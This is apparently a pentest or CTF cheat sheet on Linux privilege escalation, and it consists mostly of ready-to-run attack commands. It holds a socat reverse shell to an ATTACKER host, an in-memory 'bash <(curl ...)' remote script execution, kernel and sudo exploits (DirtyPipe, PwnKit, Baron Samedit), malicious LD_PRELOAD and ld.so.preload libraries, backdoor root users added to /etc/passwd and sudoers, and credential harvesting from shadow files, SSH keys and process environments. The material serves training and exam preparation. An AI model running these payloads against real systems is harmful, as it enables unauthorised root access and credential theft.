# Linux Privilege Escalation

## Table of Contents
- [Enumeration Checklist / Decision Order](#enumeration-checklist--decision-order)
- [TTY Upgrade & File Transfer](#tty-upgrade--file-transfer)
- [Enumeration: Manual & Automated](#enumeration-manual--automated)
- [Kernel Exploits](#kernel-exploits)
- [Sudo](#sudo)
- [SUID / SGID Binaries](#suid--sgid-binaries)
- [Capabilities](#capabilities)
- [Cron Jobs](#cron-jobs)
- [Writable Sensitive Files](#writable-sensitive-files)
- [Systemd / Services](#systemd--services)
- [NFS no_root_squash](#nfs-no_root_squash)
- [Docker / LXD / LXC](#docker--lxd--lxc)
- [Credential Hunting](#credential-hunting)
- [PATH / Wildcard Injection & LD_PRELOAD](#path--wildcard-injection--ld_preload)
- [Polkit / pkexec / D-Bus](#polkit--pkexec--d-bus)
- [Restricted Shell (rbash) Escape](#restricted-shell-rbash-escape)

For CTF-specific one-off Linux privesc tricks see ctf-misc/linux-privesc.md. For Windows privesc see ctf-privesc/windows-privesc.md. For pivoting after a shell see ctf-pivoting/pivoting.md.

---

## Enumeration Checklist / Decision Order
Work top-down; the earliest hits are usually the fastest wins.

**Step 0 — are you even on a host?** Establish this before anything else. A web RCE frequently lands
you in a container, where the entire checklist below is answering the wrong question: root inside the
container is not the objective, and time spent on SUID binaries there is wasted.

```bash
cat /proc/1/cgroup 2>/dev/null | grep -qiE 'docker|lxc|kubepod' && echo CONTAINER
ls -la /.dockerenv 2>/dev/null                 # present in most Docker images
cat /proc/1/comm                               # 'systemd' on a host, the app on a container
hostname                                       # a 12-hex-char name is a container ID
mount | grep -E 'overlay|aufs'                 # overlay root = container
```

If containerised, the goal changes to **escape or reach the host** — check for a mounted Docker
socket (`/var/run/docker.sock`), `--privileged` (`ls /dev` shows host block devices), `CAP_SYS_ADMIN`
via `capsh --print`, sensitive host paths bind-mounted in, and the Kubernetes service-account token
at `/var/run/secrets/kubernetes.io/`. See the Docker and container-escape sections later in this file
and `ctf-misc/games-and-vms-3.md`. Then resume below **on the host**, not in the container.

```
1.  id / groups        -> sudo, docker, lxd, disk, adm groups = often instant root
2.  sudo -l            -> NOPASSWD entries, env_keep, GTFOBins escape
3.  SUID/SGID          -> find / -perm -4000 ; cross-ref GTFOBins
4.  getcap -r /        -> cap_setuid=ep on python/perl/etc.
5.  Cron / pspy        -> writable scripts, wildcards, PATH abuse, root timers
6.  Writable files     -> /etc/passwd, /etc/shadow, /etc/sudoers, cron.d, .service
7.  Credentials        -> history, configs, keys, DB creds, backups, env
8.  Kernel / distro    -> uname -a ; only if 1-7 dry (exploits can panic box)
9.  Internal services  -> netstat -tlnp on 127.0.0.1 (port-forward, then re-enum)
```
Always run an automated script (linpeas) AND read its output — do not blindly trust the color coding. Confirm findings manually before firing exploits.

---

## TTY Upgrade & File Transfer
Turn a raw reverse shell into a full interactive PTY (needed for `sudo`, `su`, tab-completion, Ctrl-C).

```bash
# Spawn a PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
python  -c 'import pty; pty.spawn("/bin/bash")'
script -qc /bin/bash /dev/null           # if python absent
/usr/bin/expect -c 'spawn /bin/bash; interact'

# Full upgrade (best): after pty.spawn, background with Ctrl-Z, then on ATTACKER:
stty raw -echo; fg          # then press Enter twice
export TERM=xterm; export SHELL=/bin/bash
stty rows 50 columns 200    # match your local `stty -a`

# Alt: socat full TTY (attacker listens, then victim connects)
# attacker:
socat file:`tty`,raw,echo=0 tcp-listen:4444
# victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER:4444
```

Transfer files onto the target:
```bash
# HTTP: attacker serves, victim pulls
python3 -m http.server 80                       # attacker (in dir with file)
wget http://ATTACKER/linpeas.sh -O /tmp/lp.sh   # victim
curl http://ATTACKER/linpeas.sh -o /tmp/lp.sh   # victim

# netcat
nc -lvnp 4444 > file          # attacker (receiver)
nc ATTACKER 4444 < file       # victim (sender)  -- or reverse the direction

# base64 through the shell (no network egress)
base64 -w0 file               # source: copy output
echo -n '<b64>' | base64 -d > file   # dest

# scp (if creds/keys)
scp file user@target:/tmp/

# In-memory exec (leaves no disk artifact)
bash <(curl -s http://ATTACKER/x.sh)
```

---

## Enumeration: Manual & Automated
Manual one-liners:
```bash
id; sudo -l; hostname; uname -a; cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null                 # SUID
find / -perm -2000 -type f 2>/dev/null                 # SGID
find / -writable -type d 2>/dev/null                   # writable dirs
getcap -r / 2>/dev/null                                # capabilities
cat /etc/crontab; ls -la /etc/cron.*; ls -la /var/spool/cron 2>/dev/null
ps aux --forest; netstat -tlnp 2>/dev/null || ss -tlnp
env; cat ~/.bashrc ~/.profile 2>/dev/null
cat /etc/passwd; ls -la /home/*; find / -name "*.bak" 2>/dev/null
mount; cat /etc/fstab; cat /etc/exports 2>/dev/null    # NFS
```

Automated tools (transfer via section above):
```bash
# linpeas - most comprehensive; -a all checks, or stealth
./linpeas.sh -a | tee /tmp/lp.out
sh linpeas.sh > /tmp/lp.out 2>&1

# LinEnum / LES / lse
./LinEnum.sh -t                         # thorough
./linux-exploit-suggester.sh            # kernel/pkg CVE matcher
./lse.sh -l 2                           # level 2 = show everything

# unix-privesc-check (Debian-ish)
./unix-privesc-check standard > /tmp/upc.out

# pspy - watch cron/processes without root (catches hidden root jobs)
./pspy64 -pf -i 1000
```

GTFOBins workflow: for any binary you can run as root (sudo), that is SUID, or that has a capability, look it up at gtfobins.github.io and use the matching function (`sudo`, `suid`, `capabilities`, `file-write`, `file-read`). Pattern below in each section.

---

## Kernel Exploits
Last resort — kernel exploits can panic/crash the box. Snapshot the machine first if possible; note the state factually to the client. Only use after enumeration 1-7 is exhausted.

```bash
uname -a; uname -r; cat /etc/os-release; arch
searchsploit linux kernel $(uname -r | cut -d- -f1)
searchsploit -m <id>                         # copy exploit locally
./linux-exploit-suggester.sh                 # on target, maps CVEs to kernel
```

**DirtyCow (CVE-2016-5195)** — kernels < 4.8.3-ish. Race in COW; overwrite read-only files. `dirty.c` variant adds a root user to `/etc/passwd`; `pokemon`/`cowroot` variants overwrite a SUID binary. Caveats: can crash/hang the box, and older PoCs corrupt `/etc/passwd` (keep a backup). Prefer the `dirtycow-mem` variants that restore the file.
```bash
gcc -pthread dirty.c -o dirty -lcrypt && ./dirty <newpass>   # creates 'firefart' uid 0
su firefart
```

**DirtyPipe (CVE-2022-0847)** — kernels 5.8 to 5.16.11/5.15.25/5.10.102. Splice-into-pipe lets you overwrite read-only files (including SUID binaries and `/etc/passwd`). Reliable, does not crash.
```bash
# Compile PoC (e.g. AlexisAhmed/exploit.c or Arinerron)
gcc exploit.c -o exp
./exp /etc/passwd 1 'ii'        # patches passwd (root:ii...) -> su root, pass 'iamroot'
# variant: ./exp <suid_binary>  -> hijacks a SUID binary to drop a root shell
```

**PwnKit (CVE-2021-4034)** — polkit `pkexec` argv[0] handling; local root on default installs 2009-2022. Very reliable, no crash.
```bash
ls -l $(which pkexec)                       # confirm SUID pkexec present
git clone https://github.com/ly4k/PwnKit && gcc PwnKit.c -o PwnKit && ./PwnKit
# or one-file: ./PwnKit ; or python berdav/CVE-2021-4034
```

---

## Sudo
Always start here.
```bash
sudo -l                    # what can I run, as whom, NOPASSWD? env_keep?
sudo -V | head -1          # sudo version -> CVE matching
```

**GTFOBins sudo pattern** — for any allowed binary, use its `sudo` function. Examples:
```bash
sudo find . -exec /bin/sh \; -quit
sudo vim -c ':!/bin/sh'                 # or :py3 import os;os.system("/bin/sh")
sudo less /etc/profile                  # then !/bin/sh
sudo awk 'BEGIN {system("/bin/sh")}'
sudo env /bin/sh
sudo nmap --interactive                 # !sh  (old nmap only)
sudo perl -e 'exec "/bin/sh";'
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
```

**env_keep LD_PRELOAD / LD_LIBRARY_PATH** — if `sudo -l` shows `env_keep+=LD_PRELOAD`, inject a malicious library into any sudo-allowed binary:
```c
// pe.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash"); }
```
```bash
gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
sudo LD_PRELOAD=/tmp/pe.so <any-allowed-binary>
# LD_LIBRARY_PATH variant: compile a .so named like a lib the binary loads,
# then: sudo LD_LIBRARY_PATH=/tmp <binary>
```

**CVE-2019-14287 (`sudo -u#-1`)** — sudo < 1.8.28. If a rule allows running as any user *except* root (`(ALL, !root)`), the `-1`/`4294967295` uid resolves to 0:
```bash
sudo -u#-1 /bin/bash        # or sudo -u#4294967295 <allowed-cmd>
```

**CVE-2021-3156 (Baron Samedit)** — heap overflow in `sudoedit`, sudo 1.8.2-1.8.31p2 / 1.9.0-1.9.5p1. Root even without any sudo rights.
```bash
sudoedit -s '\' $(python3 -c 'print("A"*1000)')   # vuln check: "sudoedit: -s: ..." = patched; segfault = vuln
# PoC: blasty/CVE-2021-3156 (blasty-vs-sudo.c) or worawit's exploit_nss.py
gcc -o sudo-hax blasty.c && ./sudo-hax -u root
```

**sudo token reuse** — if you already have a shell as a user who recently ran sudo, their auth token lives in `/var/run/sudo/ts/<user>` and (with ptrace) can be forged. See `nongiach/sudo_inject`.
```bash
cat /proc/sys/kernel/yama/ptrace_scope   # must be 0
./exploit.sh                             # writes token via gdb into existing session
```

**Wildcard / relative-path in sudo rule** — a rule like `(root) /usr/bin/vim /var/www/*` may let you pass extra args or traverse. If the allowed binary is called without absolute path inside a script, hijack PATH (see PATH section). `sudoedit file` following symlinks can also read/write outside intended dir on old versions (CVE-2015-5602).

---

## SUID / SGID Binaries
SUID runs as file owner (often root); SGID as the group.
```bash
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -6000 -type f 2>/dev/null          # SUID+SGID
find / -perm -2000 -type f 2>/dev/null          # SGID
```

**GTFOBins suid pattern** — many binaries drop a shell keeping euid=0. Note `-p` to preserve privileges in bash:
```bash
./find . -exec /bin/sh -p \; -quit
./nmap --interactive                     # then !sh (old nmap)
cp --> overwrite /etc/passwd (see file-write)
./vim.basic -c ':py3 import os; os.execl("/bin/sh","sh","-pc","reset; exec sh -p")'
./bash -p                                # if bash itself is SUID
./env /bin/sh -p
systemctl -->  see systemd section
# generic: a SUID shell needs -p, else bash/sh drops privileges:
/bin/sh -p
```

**Shared-object injection** — a custom SUID binary that `dlopen`s a missing/writable `.so`. Find with `strace`/`ltrace`:
```bash
strace ./suidbin 2>&1 | grep -iE 'open|access|no such file' | grep '\.so'
# it looks for /tmp/x.so or a lib in a writable dir -> plant one:
gcc -shared -fPIC -o /path/to/missing.so - <<'EOF'
#include <stdlib.h>
static void a() __attribute__((constructor));
void a(){ setuid(0); system("/bin/bash -p"); }
EOF
./suidbin
```

**PATH hijack on SUID calling a binary without absolute path** — if the SUID binary runs e.g. `system("service ...")` or `ps` without full path:
```bash
strings ./suidbin                    # spot a bare command name, e.g. "service"
cd /tmp
echo '/bin/bash -p' > service && chmod +x service
export PATH=/tmp:$PATH
./suidbin
```

Common SUID escapes to try immediately: `find`, `bash`, `cp`, `mv`, `nano`, `vim/vi/view`, `less`, `more`, `awk`, `nmap`, `perl`, `python`, `ruby`, `php`, `node`, `env`, `tar`, `zip`, `git`, `docker`, `systemctl`, `dmesg`, `strace`, `ip`, `nano`. Always confirm exact syntax on GTFOBins.

---

## Capabilities
File capabilities grant subsets of root without SUID. `cap_setuid`/`cap_setgid` = trivial root; `cap_dac_read_search`/`cap_dac_override` = read/write any file; `cap_sys_admin`/`cap_sys_ptrace` = powerful.
```bash
getcap -r / 2>/dev/null
```
Exploitation:
```bash
# python with cap_setuid+ep
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
# perl with cap_setuid+ep
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
# ruby
./ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
# node
./node -e 'process.setuid(0); require("child_process").spawn("/bin/bash",{stdio:[0,1,2]})'
# cap_dac_read_search -> read arbitrary files (e.g. shadow) with tar/gdb/etc.
# cap_setuid on gdb, view, etc: check GTFOBins "capabilities" function
```

---

## Cron Jobs
Cron often runs as root on a schedule. Use `pspy` to catch jobs not visible in crontab.
```bash
cat /etc/crontab; ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly
crontab -l; ls -la /var/spool/cron/crontabs 2>/dev/null
grep -r CRON /var/log/syslog 2>/dev/null
./pspy64 -pf -i 1000
```

**Writable script run by root cron** — just append a payload:
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/script.sh
# wait for cron, then:
/tmp/rootbash -p
```

**Wildcard injection (tar `--checkpoint`)** — a root cron doing `tar czf backup.tar.gz *` in a writable dir. Plant filenames that become tar flags:
```bash
cd /writable/dir
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > runme.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'
# same trick with rsync (-e), chown/chmod (--reference), 7z (@listfile)
```

**PATH abuse in cron** — `/etc/crontab` usually sets `PATH=/usr/bin:/bin`. If a root job calls a bare command and an earlier writable dir is on that PATH (or the cron script prepends one), plant a fake binary:
```bash
echo '#!/bin/bash' > /writable/onpath/backup   # name = the bare command called
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /writable/onpath/backup
chmod +x /writable/onpath/backup
```

---

## Writable Sensitive Files
Check writability first: `ls -l` / `find ... -writable`.

**Writable `/etc/passwd`** — add a root user with a known password (openssl-generated hash), or blank out root's `x`:
```bash
openssl passwd -1 -salt xyz pass123                 # generate hash
echo 'hacker:$1$xyz$hashhere:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker                                            # pass123
# If second field of an existing uid-0 line can be emptied -> passwordless su
```

**Writable `/etc/shadow`** — replace root's hash with a known one:
```bash
mkpasswd -m sha-512 pass123        # or: openssl passwd -6 pass123
# paste into root's field in /etc/shadow, then: su root
```

**Writable `/etc/sudoers` or `/etc/sudoers.d/`** — grant yourself all:
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers   # or a file in sudoers.d
sudo -i
```

**Writable `/etc/cron.d/`** — drop a cron file:
```bash
echo '* * * * * root cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > /etc/cron.d/pe
```

**Writable service unit** — see systemd section.

---

## Systemd / Services
```bash
systemctl list-units --type=service
systemctl list-timers --all
find / -name '*.service' -writable 2>/dev/null
find /etc/systemd /lib/systemd -writable 2>/dev/null
```

**Writable `.service` unit run/restartable as root** — set `ExecStart` to a payload:
```ini
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb'
[Install]
WantedBy=multi-user.target
```
```bash
systemctl daemon-reload && systemctl start evil    # if you can start/restart it
# or wait for a timer / reboot
```

**Writable systemd timer** — point a `*.timer`'s `Unit=` at your service, or edit the `.service` it triggers.

**`systemctl` SUID / sudo** (GTFOBins) — write a transient unit:
```bash
TF=$(mktemp).service
echo '[Service]
ExecStart=/bin/sh -c "id > /tmp/out; chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

---

## NFS no_root_squash
If an export has `no_root_squash`, files you create as root on the client keep uid 0 on the share — plant a root-SUID binary.
```bash
cat /etc/exports                       # on target, look for no_root_squash
showmount -e TARGET                    # from attacker
# attacker (as root):
mkdir /mnt/nfs && mount -o rw,vers=3 TARGET:/share /mnt/nfs
cat > /mnt/nfs/sh.c <<'EOF'
#include <unistd.h>
int main(){ setuid(0); setgid(0); execl("/bin/bash","bash","-p",0); }
EOF
gcc /mnt/nfs/sh.c -o /mnt/nfs/sh && chmod +s /mnt/nfs/sh
# on target (any user):
/share/sh -p
```
`root_squash` (default) maps root->nobody; bypass by matching the *owning uid* of writable files instead (create a local user with that uid, write as them).

---

## Docker / LXD / LXC
`id` showing `docker`, `lxd`, or `lxc` group = root-equivalent.

**docker group** — mount host `/` into a container:
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# no internet? use an already-present image:
docker images
docker run -v /:/mnt --rm -it <existing_image> chroot /mnt bash
```

**docker.sock writable** — same effect via the API:
```bash
ls -l /var/run/docker.sock
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
```

**lxd / lxc group** — import a tiny image, launch privileged, mount host:
```bash
# build alpine image on attacker (lxc-image-builder / distrobuilder) -> alpine.tar.gz + rootfs
lxc image import ./alpine.tar.gz ./rootfs.tar.gz --alias privesc
lxc init privesc pwn -c security.privileged=true
lxc config device add pwn host disk source=/ path=/mnt/root recursive=true
lxc start pwn
lxc exec pwn /bin/sh
# inside: cd /mnt/root  -> full host filesystem as root
```

**Privileged container breakout** — inside a `--privileged` container, release_agent / cgroup escape or mount host disks (`fdisk -l; mount /dev/sda1 /mnt`). Check `capsh --print` for CAP_SYS_ADMIN.

---

## Credential Hunting
```bash
# Shell history & dotfiles
cat ~/.bash_history ~/.zsh_history ~/.mysql_history 2>/dev/null
grep -riE 'password|passwd|pwd|secret|token|api[_-]?key' /home /var/www /etc /opt 2>/dev/null

# SSH keys
find / -name id_rsa -o -name id_ecdsa -o -name 'id_*' 2>/dev/null
find / -name authorized_keys 2>/dev/null
ls -la ~/.ssh; cat ~/.ssh/id_rsa

# App / DB configs
find / -name '*.conf' -o -name '*.config' -o -name 'wp-config.php' \
   -o -name '.env' -o -name 'settings.py' 2>/dev/null | xargs grep -l -i pass 2>/dev/null
cat /var/www/**/wp-config.php; cat .env

# Backups & interesting files
find / -name '*.bak' -o -name '*.old' -o -name '*.save' -o -name '*.tar.gz' 2>/dev/null
find / -name '*.kdbx' 2>/dev/null           # KeePass
locate password 2>/dev/null

# Environment & process memory
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass
env

# Reuse creds: password reuse across users is extremely common
su root                # try any found password against every account
su <otheruser>
```

---

## PATH / Wildcard Injection & LD_PRELOAD
**Writable PATH entry** — if any dir in `$PATH` (or one you can prepend) is writable and a privileged process calls a bare command name:
```bash
echo $PATH | tr ':' '\n'
find $(echo $PATH | tr ':' ' ') -writable -type d 2>/dev/null
# plant a fake binary named after the called command earlier in PATH
```

**LD_PRELOAD / LD_LIBRARY_PATH** — see the sudo `env_keep` block; the same `.so` constructor trick applies anywhere you control these env vars for a privileged execution.

**Wildcard injection** — any root process using `*` in `tar`, `chown`, `chmod`, `rsync`, `7z`, `zip`, `scp` in a dir you can write to: create files whose names are interpreted as flags (see the cron `--checkpoint` example).

---

## Polkit / pkexec / D-Bus
- **PwnKit (CVE-2021-4034)** — see [Kernel Exploits](#kernel-exploits); `pkexec` local root, near-universal 2009-2022.
- **CVE-2021-3560 (polkit)** — auth bypass via racing a `dbus-send` call to `accounts-daemon`/`polkitd`; create a uid-0 user. polkit 0.105-0.117.
```bash
# CVE-2021-3560 concept: race user creation, then grant sudo
dbus-send --system --dest=org.freedesktop.Accounts --print-reply \
  /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser \
  string:hacker string:"pwn" int32:1 & sleep 0.005s; kill %1
# then set password/sudo via org.freedesktop.Accounts.User (see PoC secnigma)
```
- **D-Bus** — enumerate exposed methods with `busctl list` / `gdbus`; some daemons expose privileged actions callable without proper polkit auth.

---

## Restricted Shell (rbash) Escape
`rbash`/`rksh`/`lshell` block `cd`, `/`, redirection, and PATH changes. Escape into a normal shell:
```bash
# Via editors / pagers / interpreters (if allowed)
vi                        # :set shell=/bin/bash  then :shell   (or :!/bin/bash)
man man                   # then !/bin/bash
awk 'BEGIN{system("/bin/bash")}'
find / -exec /bin/bash \; -quit
ed                        # !/bin/bash
python3 -c 'import os; os.system("/bin/bash")'

# Break out via ssh directly into a command / no-rc shell
ssh user@host -t "bash --noprofile"
ssh user@host -t "/bin/sh"

# If you can set variables/PATH later, unset the restriction
export PATH=/bin:/usr/bin:$PATH
export SHELL=/bin/bash
BASH_CMDS[a]=/bin/sh; a          # populate hashed command
```
After escaping, immediately fix PATH/SHELL and re-run the enumeration checklist.

## Writable /etc/ld.so.preload as a global root preload

**Trigger:** `ls -la /etc/ld.so.preload` shows the file (or its parent /etc) writable by you, or /etc/ld.so.conf.d/ is writable — especially on a box where sudo -l is empty and no SUID binary is abusable.

Distinct from the LD_PRELOAD environment variable already documented under sudo env_keep: the env var is stripped by the loader for setuid/setgid binaries and needs an explicit env_keep grant, whereas /etc/ld.so.preload is read from disk by ld.so for every dynamically linked execution on the box including setuid ones. If you can write that file you get code execution in the next privileged process that starts. Build the usual constructor library — an _init() that calls setuid(0)/setgid(0) and execs a payload, compiled with `gcc -fPIC -shared -nostartfiles` — then write its absolute path into /etc/ld.so.preload. Trigger it by running any setuid binary such as /usr/bin/passwd, or just wait for the next root cron job or service restart. Prefer a payload that drops a suid shell and returns cleanly rather than one that execs interactively, because a blocking shell inside the constructor of every process on the system will wedge the box. If the preload file itself is not writable but /etc/ld.so.conf.d/ is, drop a .conf pointing at a directory you own and wait for ldconfig to run, then shadow a library the privileged binary links against. Remove the entry when done — a stale preload path that fails to load breaks every binary on the host.

```bash
ls -la /etc/ld.so.preload /etc/ld.so.conf.d/ 2>/dev/null
cat /etc/ld.so.conf /etc/ld.so.conf.d/* 2>/dev/null; ldconfig -p | head

cat > /tmp/x.c <<'EOF'
#include <stdlib.h>
#include <unistd.h>
void _init(){ unsetenv("LD_PRELOAD"); setuid(0); setgid(0);
  system("cp /bin/bash /tmp/rb; chmod +s /tmp/rb"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/x.so /tmp/x.c
echo /tmp/x.so > /etc/ld.so.preload
/usr/bin/passwd            # any setuid binary triggers the load
/tmp/rb -p

# cleanup
rm -f /etc/ld.so.preload
```

Source: https://offsecexams.com/cheatsheets/lhe-exam---guided-by-redblock

## disk group to raw-device read via debugfs

**Trigger:** `id` puts you in the `disk` group (or you otherwise have read on /dev/sda*, /dev/nvme0n1*, /dev/vda*) and the root filesystem is ext2/3/4.

The pack's decision checklist already flags `disk` group as often-instant-root but stops there. The concrete primitive: disk group membership grants read (and usually write) on the raw block device, which bypasses the filesystem permission layer entirely — the kernel checks the mode of the device node, not the modes of the inodes inside it. Identify the root device from `lsblk -f` or /etc/fstab, then use debugfs in one-shot mode to cat any file out of it. /etc/shadow is the obvious first target; root's SSH private key and /root/.bash_history are next. debugfs also does `ls`, `rdump` for whole directory trees, and can open the device writable, so on a writable device you can append an authorized_keys entry or plant a suid binary instead of cracking hashes. Because you are reading the on-disk image rather than the mounted view, recently written data may still be in page cache and read back stale or empty — sync first if a file you know exists comes back wrong. On non-ext filesystems the equivalent is dd-ing the device off-box and carving it, or using that filesystem's own debug tool (xfs_db, btrfs-debug-tree).

```bash
id                                    # look for: disk, adm
lsblk -f; cat /etc/fstab; ls -la /dev/sd* /dev/nvme* /dev/vd* 2>/dev/null

debugfs -R 'cat /etc/shadow' /dev/sda1
debugfs -R 'cat /root/.ssh/id_rsa' /dev/sda1
debugfs -R 'ls -l /root' /dev/sda1
debugfs -R 'rdump /root /tmp/loot' /dev/sda1

# write access on the device (debugfs -w) or, crudely:
# dd if=/dev/sda1 of=/tmp/img.raw bs=1M   # then carve offline
```

Source: https://offsecexams.com/cheatsheets/lhe-exam---guided-by-redblock

## Mount-flag preflight before dropping a SUID or a binary

**Trigger:** Your `cp /bin/bash /tmp/rb; chmod +s /tmp/rb` ran without error but `/tmp/rb -p` still returns your own uid, or a binary you dropped refuses to execute with Permission denied despite the +x bit.

Check the mount flags before concluding the vector failed. nosuid on the target mount makes the kernel silently ignore the setuid bit — chmod +s succeeds, ls shows the s, and the binary just runs unprivileged, which reads exactly like a failed exploit. noexec blocks execution outright. nodev kills device-node tricks. /tmp, /dev/shm, /home and /var are the mounts most often hardened this way, and NFS/CIFS mounts frequently carry nosuid by default, which is the usual reason a no_root_squash SUID drop appears to do nothing. Read /proc/mounts rather than /etc/fstab, since the live flags are what the kernel enforces and a filesystem may have been remounted since boot. If the mount you landed on is hostile, relocate the payload to a writable mount without the flag — often / itself, /var/tmp, or a mounted data volume — and re-test. This is a preflight rather than a vector: run it once at the start so every later SUID drop, cron payload, and dropped-toolchain decision is made against mounts you know will honour them.

```bash
findmnt -o TARGET,SOURCE,FSTYPE,OPTIONS
cat /proc/mounts | grep -E 'nosuid|nodev|noexec'

# which writable dirs will actually honour setuid?
for d in /tmp /var/tmp /dev/shm /home /var /srv; do
  [ -w "$d" ] || continue
  findmnt -no OPTIONS -T "$d" | grep -q nosuid \
    && echo "$d: nosuid (suid drop will be ignored)" \
    || echo "$d: suid OK"
done

# verify the drop actually took effect
cp /bin/bash /tmp/rb && chmod +s /tmp/rb && /tmp/rb -p -c 'id -u'
```

Source: https://offsecexams.com/cheatsheets/lhe-exam---guided-by-redblock

